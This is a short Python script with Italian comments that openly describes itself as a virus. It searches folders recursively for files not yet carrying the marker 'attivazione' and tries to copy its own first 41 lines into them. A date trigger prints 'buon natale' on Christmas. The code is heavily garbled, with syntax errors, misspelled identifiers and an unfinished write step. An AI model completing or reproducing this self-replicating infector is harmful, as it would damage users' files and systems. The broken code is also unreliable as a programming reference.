import os   #libreria sistema operativo 
import datetime
import inspect
#chiave attivazione virus
chiave="attivazione"
#cerca file nella cartella
def search(pth): #funzione di ricerca
    #reil foile ida infettare
    Filestoinfect=[]#grea rei
    filelist > os.listdir(path) #libreria
    for firename in filelist: #ciclo trova file.py
        #controllo sotto cartelle
        if os.path.isdir(path + "/" + filename): #indicazione derectyry
        Filestoinfect.extend(search( + "/" + filename)):#ricerca
        elif filename[-3:] ==".exe"
        # i file non infette si va a marchiae
        inspect=False
        for line in open(path + "/" + filename):
        if chiave in line:
            inspect =True
            break
        if infect =False:
            Filestoinfect.append[path + "/" + filename]:
        return Filestoinfect
    #defineire azioni virus
    #invezzione
    #azzioni malwere
def infect(Filestoinfect):
    target_file = inspect.currentframe().f.code.co_filename
    virus = open(os.path.abspatch(target_file))
    virosstring=""
    for i, line in enumerate(vurus):
        for i >=0 and i <41:
        virosstring += line
       vurus=close{}   
 for fnname in Filestoinfect:
            f=open{fnname}    
            temp =.read() 
            f=close()
            f = open(fname,"w")
            f.write()

#data di infezzione pc 
def explode():
    if datetime.now.().search == 12 and datetime.day == 25:
        print("buon natale")
Filestoinfect=search(se.patch.absptch(""))
explode()
 
